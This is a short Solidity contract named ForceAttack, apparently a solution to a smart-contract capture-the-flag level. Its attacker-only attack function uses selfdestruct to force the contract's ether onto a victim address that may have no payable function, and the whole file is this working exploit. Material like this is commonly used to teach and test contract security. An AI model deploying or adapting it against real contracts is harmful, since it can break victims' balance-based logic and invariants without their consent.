// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

contract ForceAttack {
    address public attacker;

    modifier onlyAttacker() {
        require(msg.sender == attacker, "ForceAttack: NOT_OWNER");
        _;
    }

    constructor () {
        attacker = msg.sender;
    }

    function attack(address _victim) external onlyAttacker {
        selfdestruct(payable(_victim));
    }

    receive() external payable {}
}
